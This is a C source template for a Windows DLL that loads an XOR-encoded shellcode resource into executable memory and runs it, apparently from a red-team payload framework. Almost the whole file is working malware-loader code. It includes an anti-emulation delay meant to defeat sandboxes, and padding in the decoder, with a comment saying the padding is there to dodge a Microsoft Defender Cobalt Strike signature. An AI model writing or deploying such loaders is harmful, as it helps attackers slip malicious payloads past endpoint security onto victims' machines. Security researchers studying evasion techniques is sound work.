#include <windows.h>
#include <stdio.h>

#define IDR_SHELLCODE 101

// Global variable to store the DLL module handle
static HMODULE g_hModule = NULL;

// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

int sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}



// Simple XOR will be detected as : 
//   https://defendersearch.r00ted.ch/threat?name=Trojan%3AWin64%2FCobaltStrike.JU%21MTB
void xor_cipher(char *ciphertext, size_t ciphertext_len, const char *key, size_t key_len) {
    int instruction_stuffing = 0;
    if (key_len == 0) return;  // prevent division by zero

    for (size_t i = 0; i < ciphertext_len; ++i) {
        instruction_stuffing += key_len * i;
        ciphertext[i] ^= key[i % key_len];
    }

    if (instruction_stuffing == 0) {
        printf("Nothing");
    }
}


// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hModule = hModule;  // Save the DLL module handle
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// Exported function
__declspec(dllexport) void process(void)
{
	DWORD result;
	{{SHELLCODE}}

    antiemulation();
	
	// Find the shellcode resource
	HRSRC hRes = FindResource(g_hModule, MAKEINTRESOURCE(IDR_SHELLCODE), RT_RCDATA);
	if (hRes == NULL) {
		MessageBoxA(NULL, "FindResource failed", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	// Get the size of the resource
	DWORD shellcode_size = SizeofResource(g_hModule, hRes);
	if (shellcode_size == 0) {
		MessageBoxA(NULL, "SizeofResource failed", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	// Load the resource
	HGLOBAL hResLoad = LoadResource(g_hModule, hRes);
	if (hResLoad == NULL) {
		MessageBoxA(NULL, "LoadResource failed", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	// Lock the resource to get a pointer to its data
	LPVOID pResData = LockResource(hResLoad);
	if (pResData == NULL) {
		MessageBoxA(NULL, "LockResource failed", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, shellcode_size, 0x3000, PAGE_EXECUTE_READWRITE);
	if (dest == NULL) {
		MessageBoxA(NULL, "VirtualAlloc failed", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	// Copy the shellcode from resource to the allocated memory
	memcpy(dest, pResData, shellcode_size);

	// Decode the shellcode
	xor_cipher((char *) dest, shellcode_size, xorkey, strlen(xorkey));

    // Execute *dest
    (*(void(*)())(dest))();
}
